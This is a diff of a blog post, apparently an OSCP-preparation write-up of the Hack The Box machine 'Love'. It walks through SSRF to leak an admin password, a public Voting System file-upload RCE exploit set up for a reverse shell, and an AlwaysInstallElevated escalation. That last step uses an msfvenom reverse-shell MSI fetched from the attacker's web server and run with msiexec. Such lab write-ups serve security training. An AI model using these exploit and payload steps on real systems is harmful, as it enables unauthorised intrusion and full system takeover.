@@ -7,14 +7,16 @@ tags: ["Hack The Box","OSCP"]
 {% assign imgDir="HTB-Love-Writeup" %}
 
 # Introduction
-The hack the box machine "Love" is an Easy machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of x. 
+The hack the box machine "Love" is an Easy machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about web enumeration, SSRF vulnerabilities, exploit identification, the Windows Registry and the AlwaysInstallElevated policy. Albeit being rated as Easy, this machine required multiple steps for acheiving remote code execution.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
-By enumerating the target, it is possible to discover 
+By enumerating the target, it is possible to discover multiple web applications. Two of these communicates over HTTPS which uses SSL certificates. By inspecting one of these certificates, it is possible to leak two hostnames of the target host. One of the hostnames leads to a web application which has an SSRF vulnerability. By abusing this vulnerabilty, it is then possible to access an internal web application which leaks the admin user's password. 
+
+The admin user's password can then be used to authenticate as the admin user to a "Voting System" web application. Once authenticated, an [authenticated RCE exploit](https://www.exploit-db.com/exploits/49445) can be used to obtain RCE as an unprivileged user. By querying the Windows Registry, it can then be discovered that this user can install MSI files as the `SYSTEM` user. A malicious MSI file can then be crafted and installed to compromise the `SYSTEM` account.
 
 # Exploitation
-We start by performing an nmap scan by executing `sudo nmap -sS -sC -sV --min-rate 10000 -p- 10.10.10.239`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `--min-rate` flag ensures that we are sening atleast 10000 packets per second to avoid long scanning times at a potential cost of reliability in the result. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that a lot of ports are open and that we are likely dealing with a Windows machine.
+We start by performing an nmap scan by executing `sudo nmap -sS -sC -sV --min-rate 10000 -p- 10.10.10.239`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `--min-rate` flag ensures that we are sending atleast 10000 packets per second to avoid long scanning times at a potential cost of reliability in the results. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that a lot of ports are open and that we are dealing with a Windows machine.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -25,7 +27,7 @@ Nmap scan report for 10.10.10.239
 Host is up (0.18s latency).
 Not shown: 64889 closed tcp ports (reset), 627 filtered tcp ports (no-response)
 PORT      STATE SERVICE      VERSION
-80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+@@@80/tcp    open  http@@@         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
 |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 |_http-title: Voting System using PHP
 | http-cookie-flags: 
@@ -34,7 +36,7 @@ PORT      STATE SERVICE      VERSION
 |_      httponly flag not set
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+@@@443/tcp   open  ssl/http@@@     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
 |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 |_ssl-date: TLS randomness does not represent time
 | tls-alpn: 
@@ -48,13 +50,13 @@ PORT      STATE SERVICE      VERSION
 | fingerprint-strings: 
 |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TerminalServerCookie, X11Probe: 
 |_    Host '10.10.16.4' is not allowed to connect to this MariaDB server
-5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+@@@5000/tcp  open  http@@@         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
 |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 |_http-title: 403 Forbidden
 5040/tcp  open  unknown
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+@@@5985/tcp  open  http@@@         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
-5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+@@@5986/tcp  open  ssl/http@@@     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 | ssl-cert: Subject: commonName=LOVE
 | Subject Alternative Name: DNS:LOVE, DNS:Love
 | Not valid before: 2021-04-11T14:39:19
@@ -63,7 +65,7 @@ PORT      STATE SERVICE      VERSION
 | tls-alpn: 
 |_  http/1.1
 7680/tcp  open  pando-pub?
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+@@@47001/tcp open  http@@@         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 49664/tcp open  msrpc        Microsoft Windows RPC
@@ -132,7 +134,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 223.48 seconds
 {% endhighlight %}
 
-We see web apps at port 80, 443, 5000, 5985, 5986, and 47001. Web applications are usually a good starting point during pentests since they can contain custom web applications with multiple vulnerabilties or host old software which already has known vulnerabilties. We can start by checking out the web applications which are reachable over HTTP. In essence, the ports 80, 5000, 5985 and 47001. Visiting these ports in a web browser, we get the forbidden and not found errors. By visiting these ports in a browser, we see that they result in a 200 OK, 403 Forbidden, 404 Not Found and 404 Not Found respectively. 
+We see web applications at the ports 80, 443, 5000, 5985, 5986, and 47001. Web applications are usually a good starting point during pentests since they can contain custom web applications with multiple vulnerabilties or host old software which already has known vulnerabilties. We can start by checking out the web applications which are reachable over HTTP. In other words, the ports 80, 5000, 5985 and 47001. Visiting these ports in a browser results in a `200 OK`, `403 Forbidden`, `404 Not Found` and `404 Not Found` respectively. 
 
 ![port80](/assets/{{ imgDir }}/port80.png)
 
@@ -142,15 +144,15 @@ We see web apps at port 80, 443, 5000, 5985, 5986, and 47001. Web applications a
 
 ![port47001](/assets/{{ imgDir }}/port47001.png)
 
-The login prompt does not appear to offer any possibility for us to register an account that we could use to log in. Before proceeding with any more enumeration of these web servers, we could check out the web applications which are handling HTTPS requests on port 443 and 5986. If we navigate to port 443 in Firefox, we get the self signed certificate warning below. 
+The login prompt at port 80, does not appear to offer any possibility for us to register an account that we could use to log in. Before proceeding with any more enumeration of these web servers, we could check out the web applications which are handling HTTPS requests on port 443 and 5986. If we navigate to port 443 in Firefox, we get the self signed certificate warning below. 
 
 ![SelfSigned](/assets/{{ imgDir }}/SelfSigned.png)
 
-If we press "Advanced..." followed by "View Certificate", we can see more information about the cert. This leaks the name of the host stage.love.htb and love.htb
+If we press "Advanced..." followed by "View Certificate", we can see more information about the certificate. This informs us that the two domain names "stage.love.htb" "and love.htb" correspond to the target host.
 
 ![domainName](/assets/{{ imgDir }}/domainName.png)
 
-We can add these to our /etc/hosts file as demonstrated below. This ensures that love.htb and staging.love.htb resolves to the IP address 10.10.10.239.
+We can add these to our `/etc/hosts` file as demonstrated below. This ensures that `love.htb` and `staging.love.htb` resolves to the IP address of the target host.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -161,15 +163,15 @@ We can add these to our /etc/hosts file as demonstrated below. This ensures that
 └─$ 
 {% endhighlight %}
 
-Next, we can try to navigate to love.htb and staging.love.htb on port 80, 443, 5000, 5985, 5986, and 47001 to see if this changes the content in any way. Upon doing this, we discover a file scanning service at [http://staging.love.htb](http://staging.love.htb). This service appears to be under construction and offers a form for receiving email updates on the progress. In addition, this pages inclues two buttons in the top-left corner. 
+Next, we can try to navigate to `love.htb` and `staging.love.htb` on port 80, 443, 5000, 5985, 5986, and 47001 to see if this changes the content in any way. Upon doing this, we discover a file scanning service at [http://staging.love.htb](http://staging.love.htb). This service appears to be under construction and offers a form for receiving email updates on the progress. In addition, this pages inclues two buttons in the top-left corner. 
 
 ![staging.love.htb](/assets/{{ imgDir }}/staging.love.htb.png)
 
-The `Home` button leads to the current page while the `Demo` button leads to the page below. This page accepts a URL and then attempts to fetch this URL to scan its content. 
+The `Home` button leads to the current page while the `Demo` button leads to the page below. This page can be used to scan files on the internet by referencing them with a URL.
 
 ![betaPHP](/assets/{{ imgDir }}/betaPHP.png)
 
-We can check if it works by requesting it to scan a file on our host and see if we receive any web requests from the target host. To do this, we start a netcat listener on port 80 and submit the URL `http://[IP]/x` where `[IP]` is the our ip address corresponding to the VPN connection.
+We can check if it works by requesting it to scan a file on our host and see if we receive any web requests from the target host. To do this, we start a netcat listener on port 80 and submit the URL `http://[IP]/x` where `[IP]` is the IP address of our network interface which corresponds to the VPN connection.
 
 ![scanMe](/assets/{{ imgDir }}/scanMe.png)
 
@@ -184,18 +186,19 @@ Accept: */*
 
 {% endhighlight %}
 
-As can be seen above, the target connects back to us on port 80 asking for the file. This means that we have a Server Side Request Forgery (SSRF). These types of vulnerabilties are useful since x. TODO
+Shortly after submitting the URL, the target connects back to us on port 80 asking for the file, as shown above. This means that we have a Server Side Request Forgery (SSRF) vulnerability. These types of vulnerabilties can be useful since they can enable us to communicate with hosts and ports which only the vulnerable host can access.
 
-We could try to use the SSRF vulnerability to access the web application running on port 5000 which gave us a 403 Forbidden earlier. This web application wasn't accessible from another host but it might be accessible for requests originating from the target host itself. We can try this by submitting "http://localhost:5000". Upon doing this, we discover that the web application did not reject us. Instead, it provides us with the string `@LoveIsInTheAir!!!!` which is the password of to the admin account.
+We could try to use the SSRF vulnerability to access the web application running on port 5000 which gave us a `403 Forbidden` error earlier. This web application wasn't accessible from another host but it might be accessible for requests originating from the target host itself. We can try this by submitting the URL "http://localhost:5000". Upon doing this, we discover that the web application did not reject us. Instead, it provides us with the string `@LoveIsInTheAir!!!!` which is the password of to the admin account.
 
 ![adminCreds](/assets/{{ imgDir }}/adminCreds.png)
 
-Attempting to log in with this password and common admin usernames does not seem to work. 
+However, attempting to log in with this password and common admin usernames at the login form we discovered earlier, does not appear to work. 
 
 ![attemptLogin](/assets/{{ imgDir }}/attemptLogin.png)
 
-Either we have the wrong admin username or we are at the wrong log in page. We can search for an admin log in page by using a directory brute forcing tool such as ffuf.
+There are two likely reasons for our authentication failues. Either, we have the wrong admin username or we are at the wrong login page as it is common to have a separate login page for administrative users. We can search for an admin login page by using a directory brute forcing tool such as [ffuf](https://github.com/ffuf/ffuf). Note that we use a lowercase wordlist since we are dealing with a PHP application which normally performs routing based on file paths and that Windows file paths are case insensitive. Using a lowercase wordlist rather than a case-sensitive wordlist could thus be faster.
 
+<!--
 Windows host + file path routing in php => Lowercase wordlist
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -219,6 +222,7 @@ Windows host + file path routing in php => Lowercase wordlist
 ┌──(kali㉿kali)-[/tmp/x]
 └─$
 {% endhighlight %}
+-->
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[~]
@@ -246,7 +250,7 @@ ________________________________________________
 
 images                  [Status: 301, Size: 330, Words: 22, Lines: 10]
 includes                [Status: 301, Size: 332, Words: 22, Lines: 10]
-@@@admin@@@                   [Status: 301, Size: 329, Words: 22, Lines: 10]
+@@@admin@@@                   [Status: @@@301@@@, Size: 329, Words: 22, Lines: 10]
 plugins                 [Status: 301, Size: 331, Words: 22, Lines: 10]
 webalizer               [Status: 403, Size: 298, Words: 22, Lines: 10]
 phpmyadmin              [Status: 403, Size: 298, Words: 22, Lines: 10]
@@ -260,41 +264,39 @@ aux                     [Status: 403, Size: 298, Words: 22, Lines: 10]
 :: Progress: [17770/17770] :: Job [1/1] :: 959 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
 {% endhighlight %}
 
-we find the same login prompt at /admin. However, if we fill in the same credentials and press "Sign In" we are successfully logged in as a user named "Neovic Devierte".
+From the results, we discover the endpoint `/admin`. Navigating to this endpoint in a browser results in an identical login prompt to the one we saw earlier. However, if we attempt to authenticate with the credentials we tried earlier, we are successfully logged in as a user named "Neovic Devierte".
 
 ![attemptLoginAdmin](/assets/{{ imgDir }}/attemptLoginAdmin.png)
 
 ![logInOK](/assets/{{ imgDir }}/logInOK.png)
 
-We can search for known exploits for this web server using searchsploit. Upon doing this, we find an [authenticated remote code execution exploit]() for version 1.0 of a PHP web application named "Voting System". We copy this exploit to a file named "exploit.py" in the current directory and inspect it with `nano`. 
-We could also choose the sqli.
+We can search for known exploits for this web application using searchsploit. Upon doing this, we find an [authenticated remote code execution exploit](https://www.exploit-db.com/exploits/49445) for version 1.0 of a PHP web application named "Voting System". We copy this exploit to a file named "exploit.py" in the current directory.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ searchsploit "voting system RCE"
+└─$ @@searchsploit "voting system RCE"@@
 -------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                  |  Path
 -------------------------------------------------------------------------------- ---------------------------------
 Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution | php/webapps/50088.py
-Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)       | php/webapps/49445.py
+@@@Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)@@@       | @@@php/webapps/49445.py@@@
 -------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
                                                                                                                   
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ searchsploit -p 49445           
+└─$ @@searchsploit -p 49445@@       
   Exploit: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
       URL: https://www.exploit-db.com/exploits/49445
      Path: /usr/share/exploitdb/exploits/php/webapps/49445.py
 File Type: Python script, ASCII text executable, with very long lines (6002)
 
-Copied EDB-ID #49445's path to the clipboard
+@@@Copied EDB-ID #49445's path to the clipboard@@@
                                                                                                                   
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ cp /usr/share/exploitdb/exploits/php/webapps/49445.py ./exploit.py
-                                                                                                                  
-┌──(kali㉿kali)-[/tmp/x]
-└─$ nano exploit.py 
+└─$ @@cp /usr/share/exploitdb/exploits/php/webapps/49445.py ./exploit.py@@
 {% endhighlight %}
+
+The full exploit is shown below.
 
 {% highlight python linenos %}
 # Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
@@ -308,17 +310,17 @@ Copied EDB-ID #49445's path to the clipboard
 import requests
 
 # --- Edit your settings here ----
-IP = "love.htb" # Website's URL
-USERNAME = "admin" #Auth username
-PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
-REV_IP = "10.10.16.4" # Reverse shell IP
+IP = "192.168.1.207" # Website's URL
+USERNAME = "potter" #Auth username
+PASSWORD = "password" # Auth Password
+REV_IP = "192.168.1.207" # Reverse shell IP
 REV_PORT = "8888" # Reverse port
 # --------------------------------
 
-INDEX_PAGE = f"http://{IP}/admin/index.php"
-LOGIN_URL = f"http://{IP}/admin/login.php"
-VOTE_URL = f"http://{IP}/admin/voters_add.php"
-CALL_SHELL = f"http://{IP}/images/shell.php"
+INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
+LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
+VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
+CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
 
 payload = """
 
@@ -415,7 +417,7 @@ CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
 {% endhighlight %}
 {% endcomment %}-->
 
-At the top of the exploit, there are four settings parameters we need to configure. We configure them as shown below. Note that the `REV_IP` should be set to the IP address of our host over the VPN connection as this is where the target host will connect to provide a reverse shell. Finally, we also need to remove "votesystem" from the `INDEX_PAGE`, `LOGIN_URL`, `VOTE_URL` and `CALL_SHELL` parameters since the admin pages are located in the root of the web application in our case. 
+At the top of the exploit, there are four parameters we need to configure. We configure them as shown below. Note that the `REV_IP` should be set to the IP address of our host over the VPN connection as this is where the target host will connect to provide a reverse shell. Finally, we also need to remove "votesystem" from the `INDEX_PAGE`, `LOGIN_URL`, `VOTE_URL` and `CALL_SHELL` parameters since the voting system is located at the root of the web server in our case. 
 {% highlight python linenos %}
 # --- Edit your settings here ----
 IP = "love.htb" # Website's URL
@@ -431,7 +433,7 @@ VOTE_URL = f"http://{IP}/admin/voters_add.php"
 CALL_SHELL = f"http://{IP}/images/shell.php"
 {% endhighlight %}
 
-Next, we execute "nc -lvp 8888" to start a listener on port 8888 and run the exploit.
+Next, we execute "nc -lvp 8888" to start a netcat listener on port 8888. Then, we run the exploit.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -458,12 +460,23 @@ whoami
 C:\xampp\htdocs\omrs\images>
 {% endhighlight %}
 
-After a couple of seconds we receive a shell on the target as a user named "phoebe", as can be seen above.
+After a couple of seconds, we receive a shell on the target as a user named "phoebe", as can be seen above.
 
 # Privilege Escalation
+To understand how to privesc the target we must first familiarize ourselves with the Windows Registry. The Windows Registry is a hierarchical database which stores Windows-specific settings through the usage of keys and values. The Windows Registry is organized into a hierarchy of keys. Each key consist of one root key and any amount of subkeys. For example, the key `HKEY_LOCAL_MACHINE\Software\Microsoft` refers to the subkey `Microsoft` of the subkey `Software` of the `HKEY_LOCAL_MACHINE` root key. One way to interact with the registry is through the built-in Registry Editor program in Windows. We can start this program by pressing `CTRL+r`, typing "regedit" and pressing enter.
 
-We can query the windows registry for many things. F.e always install elevated. 
-TODO BG
+![registry](/assets/{{ imgDir }}/registry.png)
+
+We can use the input field at the top of the GUI, to navigate to a certain key. For example, we can navigate to `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` as shown above. This location in the registry contains environment variables such as the `Path` variable. Another way to interact with the registry is to use the `reg` command in cmd, as demonstrated below. Note that the key is specified after `reg query` and that the value we want to extract from this key is specified using the `/v` flag.
+
+{% highlight none linenos %}
+C:\Users\Thomas>@@reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path@@
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+    @@@Path@@@    REG_SZ    @@@C:\Program Files\Microsoft\jdk-11.0.12.7-hotspot\bin;C:\Program Files (x86)\VMware\VMware Player\bin\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;C:\Program Files\PuTTY\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\dotnet\;C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\@@@
+{% endhighlight %}
+
+There are a large amount of different registry values that could be interesting when attempting to discover privilege escalation possiblities. One of these is `AlwaysInstallElevated` which can be found at `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`. If this value is set to `0x1` in both of these locations, the current user can install MSI files in the context of the SYSTEM account. This means that anyone could compromise the SYSTEM user by installing a malicious MSI file. If we inspect the content of these two registry locations on the target host, we can see that this feature is enabled. 
 
 {% highlight none linenos %}
 C:\xampp\htdocs\omrs\images>@@reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated@@
@@ -478,12 +491,9 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
     @@@AlwaysInstallElevated@@@    REG_DWORD    @@@0x1@@@
-
-
-C:\xampp\htdocs\omrs\images>
 {% endhighlight %}
 
-We generate our malicious msi file with msfvenom. The `windows/shell_reverse_tcp` is an unstaged reverse shell payload, meaning that we can catch it with a netcat listener. Lhost and lport specify the ip and port the reverse shell should connect back to. -f specifies that we want the payload in the format of an msi file. We save it to a file named "rs.msi".
+We can generate a malicious MSI file with msfvenom as shown below. The `windows/shell_reverse_tcp` is an unstaged reverse shell payload, meaning that we can catch it with a netcat listener. The `Lhost` and `lport` parameters specify an IP address and a port number which the reverse shell payload should connect back to. Furthermore, we use the `-f` flag to specify that we want the payload in the format of an MSI file. We save the resulting MSI file in a file named "rs.msi".
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -495,7 +505,7 @@ Payload size: 324 bytes
 @@@Final size of msi file: 159744 bytes@@@
 {% endhighlight %}
 
-The next step is to download this payload to the target and execute it. We start by starting a python web server by executing `python3 -m http.server 80`. Then, in our reverse shell, we start powershell by executing "powershell". We then run the [Invoke-WebRequest]() cmdlet with the -Uri and -OutFile flags to download our malicious MSI file. We use the -Uri flag to specify the URL of the malicious MSI file on our web server and the -OutFile flag to specify where the file should be written. Note that we write the file to the C:\Windows\temp directory since this is normally a location where all windows accounts have `Write` permissions.
+The next step is to download this payload to the target and execute it. We start by initializating a Python web server by executing `python3 -m http.server 80`. Then, in our reverse shell, we start Powershell by executing `powershell`. We then run the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) cmdlet with the `-Uri` and `-OutFile` flags to download our malicious MSI file. We use the `-Uri` flag to specify the URL of the malicious MSI file on our web server and the `-OutFile` flag to specify where the file should be written. Note that we write the file to the `C:\Windows\temp` directory since this is normally a location where all windows accounts have `Write` permissions.
 
 {% highlight none linenos %}
 C:\xampp\htdocs\omrs\images>@@powershell@@
@@ -509,7 +519,8 @@ Try the new cross-platform PowerShell https://aka.ms/pscore6
 Invoke-WebRequest -Uri "http://10.10.16.4/rs.msi" -OutFile "C:\Windows\temp\rs.msi"
 {% endhighlight %}
 
-Once we execute the command, we can see in the outpuy of the Python web server that the download was successful.
+Shortly after executing the command, an entry in the in the output Python web server appears, indicating that the download was successful.
+
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@sudo python3 -m http.server 80@@                                             
@@ -517,10 +528,10 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 @@@10.10.10.239 - - [18/Apr/2022 11:03:17] "GET /rs.msi HTTP/1.1" 200 -@@@
 {% endhighlight %}
 
-Next, we execute "nc -lvp 8889" to start a netcat listener on port 8889. Then, we use msiexec to install our malicious MSI file. Note that we use \quiet to specify that x and \qn to specify that x. The \i flag is simply used to specify that we want to install an MSI file.
+Next, we execute "nc -lvp 8889" to start a netcat listener on port 8889. Then, we use [msiexec](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec) to install our malicious MSI file. We use the `/i` flag to specify that we want to install an MSI file.
 {% highlight none linenos %}
-PS C:\xampp\htdocs\omrs\images> @@msiexec /quiet /qn /i C:\Windows\Temp\rs.msi@@
-msiexec /quiet /qn /i C:\Windows\Temp\rs.msi
+PS C:\xampp\htdocs\omrs\images> @@msiexec /i C:\Windows\Temp\rs.msi@@
+msiexec /i C:\Windows\Temp\rs.msi
 PS C:\xampp\htdocs\omrs\images>
 {% endhighlight %}
 
@@ -540,5 +551,4 @@ C:\WINDOWS\system32>
 {% endhighlight %}
 
 As soon as we execute the malicious MSI file, our netcat listener receives a connection and we obtain a shell as the `SYSTEM` account on the target host!
-
 
